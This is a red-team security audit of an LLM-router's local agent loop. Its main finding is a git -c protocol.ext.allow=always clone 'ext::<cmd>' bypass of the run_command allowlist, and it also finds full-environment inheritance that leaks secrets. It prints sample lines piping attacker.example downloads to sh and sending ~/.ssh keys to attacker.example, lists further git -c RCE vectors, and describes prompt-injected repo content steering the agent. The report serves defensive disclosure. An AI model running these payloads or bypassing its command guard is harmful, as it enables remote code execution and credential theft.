# Security Audit — Phase 25 (Red Team)

Subject: `~/Projects/llm-router` @ `357a402e8f462f913cf9368244557eaaf7711beb`
(branch `fix/audit-2026-09-22`). See `audit/FROZEN_STATE.md` for platform/ambient
state. All probes ran under `export LLM_ROUTER_HOME=$(mktemp -d)`, prefixed
`LLM_ROUTER_BASH_INTERCEPT=off`, using `.venv/bin/python`, synthetic canary
secrets only (`SYNTHETIC_CANARY_API_KEY=sk-CANARY-DO-NOT-LEAK-12345`), and
disposable `mktemp -d` sandboxes for any filesystem target. Nothing was written
to `~/.llm-router` or `~/.claude`. No fix was applied — discovery only.

Per instructions, SECURITY.md and code comments were treated as unverified
claims and re-derived from behavior wherever a claim mattered to a finding.

## Attacker models used below

| Model | Description |
|---|---|
| **A1 — malicious/injected repo content** | A file inside the project a local-model agent loop is pointed at contains text designed to be read as an instruction (indirect prompt injection): a README, a code comment, a test fixture, a commit message. |
| **A2 — compromised/adversarial local-model output** | The Ollama (or other) model driving `agent_loop`/`llm_local_task` chooses to call `run_command` with attacker-shaped arguments, whether because of A1 or because it is simply a capable model asked an open-ended objective. |
| **A3 — MCP client / orchestrating agent** | Whatever process can call the `llm_local_task` MCP tool (normally Claude Code, but any MCP client with the right permissions) — controls `objective`, `workdir`, `apply_writes`. |
| **A4 — local user / same-host neighbour** | Another process or account on the same machine, no special privileges, reaching a loopback port. |
| **A5 — generated verifier code** | A groundtruth verifier snippet, itself LLM-authored, executed by `scripts/groundtruth/verifiers.py`. |

---

## FINDING 1 — CONFIRMED, CRITICAL: `run_command`'s allowlist is bypassed by `git -c` config injection → arbitrary command execution outside the sandbox

**File:** `src/llm_router/hooks/agent_writes.py` (`guard_command`, `_ALLOWED_PROGRAMS`, `_BLOCKED_SUBCOMMANDS`) and `src/llm_router/hooks/agent_loop.py` (`execute_tool`, `run_command` branch).

**Attacker model:** A2 (and, transitively, A1 — repo content can suggest this exact command to the model) and A3. **Reachable in the DEFAULT configuration** — `LLM_ROUTER_AGENT_COMMANDS` unset resolves to `CMD_ALLOWLIST`, which is the default `command_mode()`.

**Root cause:** `guard_command` scans `argv[1:]` for a blocked *subcommand* token (`push`, `reset`, `clean`, …) but never inspects `-c key=value` configuration overrides, which git accepts before the subcommand. `git`'s own `-c` mechanism can reintroduce full command execution regardless of which subcommand is used, because:
- `protocol.ext.allow=always` unlocks the `ext::<command> <args…>` transport, which git execs directly (no shell needed on git's side — it does its own `execvp`-style dispatch).
- `clone` is not in `_BLOCKED_SUBCOMMANDS["git"]` (only push/reset/clean/checkout/switch/restore/rebase/merge/cherry-pick/revert/gc/prune/remote/config/tag/branch/stash/am/apply are).

**Proof (reproduced against the real production code path, `agent_writes.guard_command` + `agent_loop.execute_tool`, in a disposable sandbox):**

```
cmd = "git -c protocol.ext.allow=always clone 'ext::touch /tmp/.../PWNED_FULLCHAIN' outdir3"
guard_command(shlex.split(cmd))  ->  (True, '')          # ALLOWED
execute_tool("run_command", {"command": cmd}, sandbox_root)
```//
Result: `/tmp/.../PWNED_FULLCHAIN` was created. `git clone` exits 128 (no real
remote), but the `ext::` handler runs *before* that failure, so the embedded
command (in production this would be `curl attacker.example/x | sh`, or
`sh -c "cat ~/.ssh/id_ed25519 | curl -d @- attacker.example"`, etc.) executes
unconditionally with the OS privileges of whoever is running the loop, and is
**not confined to `project_root`** — `_resolve_path`'s sandbox only governs
`read_file`/`write_file`/`edit_file` path arguments; `run_command`'s argv is
opaque to it. The written/executed target can be anywhere the OS user can
write, e.g. `~/.ssh`, `~/.bash_profile`, or the real `~/.llm-router` if
`LLM_ROUTER_HOME` is not isolated.

**Also confirmed, closed as INVALIDATED:** the classic `git -c core.pager=<cmd>`
pager-hijack RCE does **not** fire through this code path. `agent_loop.py`
calls `subprocess.run(argv, capture_output=True, ...)`, which always gives git
a pipe (never a tty) for stdout; git only spawns the configured pager when it
believes stdout is a terminal, `-p`/`--paginate` included. Verified: identical
`-c core.pager=touch …` payload created a marker file only when stdout was a
real pty (`script -q /dev/null git … `), never under `capture_output=True`.
This closes one vector but not the class — `-c` remains completely
unvalidated, and `ext::` is sufficient by itself. Other untested `-c` vectors
worth flagging for the guard's owner: `credential.helper=!<cmd>`,
`alias.<name>=!<cmd>` (requires a matching invocation, so less directly
reachable in one call), `uploadpack.packObjectsHook` (needs the local side to
be the server, not applicable here), `core.fsmonitor=<cmd>` (may not require a
tty — not tested, time-boxed out of this pass).

**Chain, end to end:**
```
untrusted repo content (A1) or open-ended objective (A3)
  -> local model in run_agent_loop chooses run_command
  -> guard_command("git", ["-c","protocol.ext.allow=always","clone","ext::<cmd>","x"])
     -> "git" in _ALLOWED_PROGRAMS; "clone" not in _BLOCKED_SUBCOMMANDS["git"];
        "-c" and its value are never inspected  => ALLOWED
  -> subprocess.run(argv, shell=False, cwd=project_root)   # no shell, but git itself execs <cmd>
  -> arbitrary command runs with the caller's OS privileges, outside project_root,
     with (see Finding 2) the FULL parent environment
```

**Severity:** CRITICAL. This is a complete bypass of the "inspection-only,
read-only allowlist" the module's own docstring promises ("chosen by one
rule: it reads state, it does not change it, and it does not reach the
network" — `git clone`/`ext::` reads nothing, changes the filesystem, and
reaches the network trivially).

---

## FINDING 2 — CONFIRMED, HIGH: `agent_loop.py`'s `run_command` inherits the full parent environment — `safe_subprocess.get_delegated_env` is never called on this path

**File:** `src/llm_router/hooks/agent_loop.py:288-292` (the only `subprocess.run` call in the file).

**Attacker model:** A2 / A1, default configuration.

`src/llm_router/safe_subprocess.py` exists specifically to strip secrets before
handing an environment to "model-authored commands" (its own docstring, and
`get_delegated_env`'s docstring: "The environment for a subprocess running
model-authored commands... Every provider key, OAuth token and cloud
credential in the parent process is absent"). `agent_loop.execute_tool`'s
`run_command` branch — the literal, only place a local model's command string
becomes a subprocess in this module — calls:

```python
result = subprocess.run(argv, capture_output=True, text=True, timeout=30, cwd=str(project_root))
```

No `env=` argument at all, which means `subprocess.run` inherits `os.environ`
of the parent process in full. `safe_subprocess.get_safe_env`/
`get_delegated_env` are not imported or referenced anywhere in this file.

**Proof (reproduced against `execute_tool` directly, not a standalone repro):**

```
export SYNTHETIC_CANARY_API_KEY="sk-CANARY-DO-NOT-LEAK-12345"
execute_tool("run_command",
             {"command": "python3 -c \"import os; print(os.environ.get('SYNTHETIC_CANARY_API_KEY'))\""},
             project_root)
=> 'sk-CANARY-DO-NOT-LEAK-12345\n'
```
`python3` is on `_ALLOWED_PROGRAMS`; nothing about `guard_command` restricts
*what an allowed program reads from its own environment*. Note `env`/`printenv`
themselves are not on the allowlist, but any allowed interpreter (`python`,
`python3`, `node`, `go run`, `awk`) can read and print `os.environ` just as
well, and `git`'s `ext::` bypass (Finding 1) can exfiltrate it over the network
outright.

**Consequence in the real deployment:** on this machine `os.environ` at the
time this loop runs contains (per `FROZEN_STATE.md`) `XAI_API_KEY` and
`CLAUDE_CODE_MESSAGING_TOKEN` — neither was read or printed in this audit
(radioactive per the rules), but the mechanism that would leak them is now
demonstrated with a synthetic stand-in, on the exact code path a real
prompt-injected or adversarial local model would use. The leaked value returns
as the tool's `content`, which (a) is appended to `messages` and sent back to
the *next* LLM turn — including any non-local backend the loop is pointed at,
per the module's own docstring ("gives any LLM (Ollama, Gemini, OpenAI) file
tool access") — and (b) is captured verbatim by `_trace.emit("tool.result", …,
result=tool_result)`, which persists to `~/.llm-router/trace.jsonl` when
`LLM_ROUTER_TRACE=1` (opt-in, not default — confirmed by reading `trace.py`,
not executed against the live store).

**Chain:**
```
attacker-shaped run_command argument (an allowed program) reads os.environ
  -> printed into tool_result (no scrubbing — get_delegated_env is not called here)
  -> appended to `messages`, sent to the model on the NEXT loop iteration
  -> if the loop's backend is a cloud provider (per module docstring, not just Ollama),
     the secret leaves the machine in that request body
  -> AND/OR persisted to trace.jsonl if LLM_ROUTER_TRACE=1
```

**Note on scope:** `scripts/groundtruth/verifiers.py::run_verifier` (Finding 5,
below) is a sibling piece of "run generated/model-authored code" machinery and
**does** call `get_delegated_env` correctly, with a fail-closed fallback — so
the allowlist-env pattern exists and works elsewhere in the tree. Its absence
specifically in `agent_loop.py`'s `run_command` looks like an omission, not a
considered decision — the module's own top-of-file docstring even lists "Safe
subprocess" reasoning for path sandboxing but says nothing about environment
scrubbing for `run_command`.

---

## FINDING 3 — CONFIRMED, MEDIUM/HIGH (reachability-dependent): `llm_local_task`'s `workdir` and `objective` give an MCP caller (or anything that can inject the objective) unsandboxed reach via Finding 1/2

**File:** `src/llm_router/tools/local_task.py::llm_local_task`.

**Attacker model:** A3 (any MCP client that can call this tool) composed with
A1 (repo content the objective causes the loop to read) or A2.

`llm_local_task` is a registered MCP tool (`register()` at the bottom of the
file) that takes `objective` (free text handed to the local model) and
`workdir` (an arbitrary filesystem path — "Files here may be modified", not
restricted to any particular project). It runs `run_agent_loop` — the exact
loop and `execute_tool`/`guard_command` path from Findings 1 and 2 — over
`project_root = Path(workdir)`. With `apply_writes=True` (a documented,
intended mode, not a bypass) it flips `LLM_ROUTER_AGENT_WRITES=apply` for the
call, so `write_file`/`edit_file` actually land (confined to `workdir` by
`_resolve_path`) — but `run_command` was already unrestricted-by-`workdir` in
Finding 1, and command mode is untouched by `apply_writes` (the code
explicitly separates the two, per an already-fixed 2026-09-14 bug documented
in its own docstring — verified current: `apply_writes` sets only
`LLM_ROUTER_AGENT_WRITES`, not `LLM_ROUTER_AGENT_COMMANDS`).

**Net effect:** any caller of this MCP tool can point `workdir` at any
directory the OS user can write, hand the worker model an `objective`, and —
if the worker model ever calls `run_command` with the Finding-1 payload
(spontaneously, or because `objective`/repo content nudges it there) — get
Finding 1's arbitrary-command-execution and Finding 2's full-environment
capture, entirely outside whatever directory `workdir` claimed to scope the
task to.

This is not a new bug distinct from Findings 1/2; it is the demonstration
that they are reachable from the MCP surface, not just from a hand-crafted
unit-test call into `agent_loop` internals.

---

## FINDING 4 — DESIGN RISK, ACKNOWLEDGED BY CODE: gateway/route_server are unauthenticated by default; only bind + CSRF-Origin guard defend them

**Files:** `src/llm_router/net_bind.py`, `src/llm_router/gateway.py`, `src/llm_router/route_server.py`.

**Attacker model:** A4 (local user / same-host neighbour). Default
configuration for the loopback bind and the CSRF guard; the bearer token is
explicitly opt-in.

Verified independently (not trusting the module's own docstring, per audit
rule 8):
- `grep -c "Depends(" gateway.py route_server.py` → the only hit in
  `gateway.py` is inside a comment string describing this very fact; actual
  count of FastAPI dependency-injected auth is 0 in both files.
- `_check_gateway_auth` (bearer-token check) exists and uses
  `secrets.compare_digest`, but is a no-op whenever `gateway_token()` returns
  `None` — which it does by default (`LLM_ROUTER_GATEWAY_TOKEN` unset and no
  token file). Confirmed it *is* wired into `_guard_cross_origin`, an
  ASGI middleware applied to every route (not just one endpoint) — so when a
  token *is* configured, it does cover the whole app; when it is not
  configured (default), every route is open to any local caller that presents
  a loopback `Host`/no cross-site `Origin` (i.e., curl, an SDK, or any other
  local process — not just a browser).
- `net_bind.refuse_public_bind_or_exit` is real and is called before `uvicorn.run`
  in `gateway.py` (`main()`), gating `0.0.0.0`/`::`/empty-host binds behind
  `LLM_ROUTER_ALLOW_PUBLIC_BIND`. Not independently re-tested by binding a real
  socket in this pass (would have required starting a server outside the
  `mktemp` sandbox discipline); accepted as code-verified rather than
  behaviorally verified.

**Consequence:** in the default configuration, any other local process or
account able to reach `127.0.0.1:<gateway-port>` can drive real (possibly
paid) model calls through the gateway with zero authentication — a cost-abuse
and request/response-visibility risk from A4, explicitly out of scope of what
`net_bind.py`'s own docstring says it defends ("Deliberately NOT
authentication... does nothing about an attacker already on the loopback
interface"). This is accurately self-described in the code, not a silent gap —
classified as DESIGN RISK rather than a bug, but worth surfacing because nothing
in the default setup nudges an operator toward setting
`LLM_ROUTER_GATEWAY_TOKEN` on a shared or multi-tenant machine.

---

## FINDING 5 — INVALIDATED (already remediated): `run_verifier` env scrubbing works as claimed

**File:** `scripts/groundtruth/verifiers.py::run_verifier`.

**Attacker model:** A5 — a generated verifier snippet is arbitrary Python,
executed via `subprocess.run([sys.executable, "-c", script], ...)`. This *is*
by design "execute generated code" and is not sandboxed against filesystem or
network access — only against **environment/secret** exposure.

Code-read confirms (own comment, cross-checked against actual call): it calls
`llm_router.safe_subprocess.get_delegated_env(extra)` — the allowlist function
from Finding 2's sibling module — and, if that import fails, fails CLOSED to
`{"PATH": os.defpath, **extra}` rather than falling back to `os.environ`. This
is the opposite failure mode of Finding 2 and is correctly built. Not
re-executed with a live canary in this pass (the code path is short and the
mechanism is identical to what Finding 2 already proved works when actually
called); treated as code-confirmed, not behaviorally re-proven, hence listed
separately from a CONFIRMED finding.

**Residual, not remediated by that fix, DESIGN RISK:** the verifier still runs
with the *user's own* filesystem and network access (no container, no seccomp,
no chroot) — `docs/PROPOSAL_LOCAL_EXECUTION.md` is referenced elsewhere in the
tree as exactly the un-done confinement work. A malicious generated verifier
(e.g., if the task-authoring step itself were compromised or prompt-injected)
could still read arbitrary files or make network calls; it simply can't steal
`ANTHROPIC_API_KEY`/`XAI_API_KEY`/etc. via environment inheritance anymore.
Not independently reproduced here (would require compromising the
task-authoring step, out of this pass's reach) — HYPOTHESIS only, flagged for
completeness since the task explicitly asked "what can a generated verifier
do."

---

## FINDING 6 — INVALIDATED: `_resolve_path` correctly blocks symlink escape

**File:** `src/llm_router/hooks/agent_loop.py::_resolve_path`.

**Attacker model:** A1 — a malicious repo could ship a symlink pointing outside
`project_root` (e.g. `evil_link -> /etc` or `-> $HOME`), hoping a subsequent
`write_file`/`read_file` call through it escapes the sandbox.

**Proof:** created `sandbox/escape_link -> <outside-tmp-dir>` and called
`_resolve_path("escape_link/pwn.txt", sandbox_root)` directly:
```
PermissionError: Path 'escape_link/pwn.txt' resolves outside project root
```
`Path.resolve()` collapses the symlink before the `relative_to()` boundary
check runs, so the check is evaluated against the *real* target, not the
apparent one. This closes the obvious symlink-escape hypothesis for
`read_file`/`write_file`/`edit_file`/`list_files`/`search_files`. Not tested:
a TOCTOU swap of the symlink between `_resolve_path`'s `.resolve()` and the
actual `open()`/`write_text()` call a few lines later in `execute_tool` — this
would require a concurrent local process racing the write, which needs A4
(co-resident attacker) rather than A1 alone, and was not attempted (low
realistic payoff: a co-resident attacker with write access to the sandbox
directory has much easier paths already, e.g. modifying the file directly).
Left as HYPOTHESIS, not tested.

---

## Findings NOT substantiated / out of budget

- `git -c core.fsmonitor=<cmd>` / `credential.helper=!<cmd>` / `alias.*=!<cmd>`
  as additional non-tty `-c`-injection RCE vectors alongside the confirmed
  `ext::` one — plausible, same root cause as Finding 1, not individually
  reproduced (Finding 1 already gives a CONFIRMED chain from the same root
  cause; enumerating every `-c` vector was not necessary to establish
  severity and was time-boxed out).
- Gateway public-bind refusal (`net_bind.refuse_public_bind_or_exit`) —
  code-verified only, not behaviorally verified by actually attempting a
  `0.0.0.0` bind and connecting from a simulated remote address.
- Persistence/state-store poisoning ("written into a store later read as
  trusted") — no confirmed live instance found in this pass beyond the
  already-fixed `agentic/telemetry._db_path()` `LLM_ROUTER_HOME` bug recorded
  in `FROZEN_STATE.md` (pre-existing, already remediated in `d766ec6`, not
  re-litigated here).

---

## Summary table

| # | Title | Attacker model | Reachability | Classification |
|---|---|---|---|---|
| 1 | `git -c protocol.ext.allow=always ... ext::<cmd>` bypasses `run_command` allowlist → arbitrary command execution, unsandboxed | A1/A2/A3 | Default config | **CONFIRMED — CRITICAL** |
| 2 | `run_command` inherits full parent env (no `get_delegated_env`) | A1/A2 | Default config | **CONFIRMED — HIGH** |
| 3 | `llm_local_task` MCP tool exposes Findings 1/2 with attacker-controlled `workdir`/`objective` | A3 | Default config, `apply_writes` is a documented mode not a misuse | **CONFIRMED (composition) — HIGH** |
| 4 | Gateway/route_server unauthenticated by default; only loopback bind + CSRF-Origin guard | A4 | Default config | DESIGN RISK (self-acknowledged) |
| 5 | `run_verifier` env scrubbing is correct; no fs/network sandbox for generated code | A5 | N/A (env leak invalidated); fs/net access is HYPOTHESIS | INVALIDATED (env) / HYPOTHESIS (fs/net) |
| 6 | Symlink escape via `_resolve_path` | A1 | — | INVALIDATED |
